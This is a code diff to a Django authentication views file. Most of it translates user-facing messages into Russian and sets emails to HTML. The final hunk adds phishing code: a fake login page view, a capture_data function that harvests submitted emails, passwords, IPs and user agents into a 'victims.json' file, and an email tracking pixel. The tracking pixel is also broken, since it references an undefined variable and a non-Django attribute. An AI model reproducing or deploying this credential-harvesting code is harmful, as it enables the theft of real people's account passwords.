@@ -15,13 +15,15 @@ from .token import email_verification_token
 from .forms import UserRegisterForm
 import pyotp
 from random import randint
+import json 
+
 
 
 def confirmation_view(request, status):
     messages = {
-        'success': 'Thank you for your email confirmation. Now you can <a href="/login">login</a> your account.',
-        'invalid': 'Activation link is invalid!',
-        'email_sent': 'A confirmation email has been sent to the specified email address. Check your email to complete the registration.'
+        'success': 'Поздравляем! Ваша почта была успешно подтверждена. Теперь вы можете <a href="/login">войти</a> в свой аккаунт.',
+        'invalid': 'Ссылка для активации недействительна.',
+        'email_sent': 'Письмо с инструкцией для подтверждения регистрации было выслано на указанный электронный адрес.</p>'
     }
     message = messages.get(status, 'Unknown status.')
     return render(request, 'confirm.html', {'message': message})
@@ -41,7 +43,7 @@ def login_view(request):
             otp_obj.otp_secret = key
             otp_obj.save()
             current_site = get_current_site(request)
-            mail_subject = 'A one-time password has been sent to your email'
+            mail_subject = 'Одноразовый код для входа'
             message = render_to_string('otp_body.html', {
                 'user': user,
                 'domain': current_site.domain,
@@ -50,6 +52,7 @@ def login_view(request):
             email_send = EmailMessage(
                 mail_subject, message, to=[email]
             )
+            email_send.content_subtype = 'html'  # Указываем, что это HTML письмо
             email_send.send()
             request.session['email'] = email
             request.session['time'] = time
@@ -94,7 +97,7 @@ def register(request):
             user.is_active = False
             user.save()
             current_site = get_current_site(request)
-            mail_subject = 'Activation link has been sent to your email id'
+            mail_subject = 'Активация аккаунта'
             message = render_to_string('mail_body.html', {
                 'user': user,
                 'domain': current_site.domain,
@@ -105,6 +108,7 @@ def register(request):
             email = EmailMessage(
                 mail_subject, message, to=[to_email]
             )
+            email.content_subtype = 'html'  # Указываем, что это HTML письмо
             email.send()
             return confirmation_view(request, 'email_sent')
         else:
@@ -150,3 +154,33 @@ def update_profile(request, uidb64):
     #         user = None
     # return
 
+def fake_login(request):
+    return render(request, 'fake_login.html')
+
+def capture_data(request):
+    print("sosal")
+    if request.method == 'POST':
+        email = request.POST['email']
+        password = request.POST['password']
+        ip = request.META.get('REMOTE_ADDR')
+        victim_data = {
+            'email':email,
+            'password':password,
+            'ip': ip,
+            'user_agent':request.headers.get('User-Agent')
+        }
+        with open('victims.json', 'a') as file:
+            file.write(json.dumps(victim_data)+'\n')
+        print(f"Creds from {ip}: email: {email}\npassword: {password}")
+    return redirect('/login')
+
+def track_pixel(request):
+    tracking_data = {
+        'event': 'email_opened', 
+        'ip': request.remote_addr,
+        'user_agent': request.headers.get('User-Agent')
+    }
+    with open('tracking_data.json', 'a') as file: 
+        file.write(json.dumps(data) + '\n')
+    print(f"Email opened by {request.META.get('REMOTE_ADDR')}")
+    return "",204
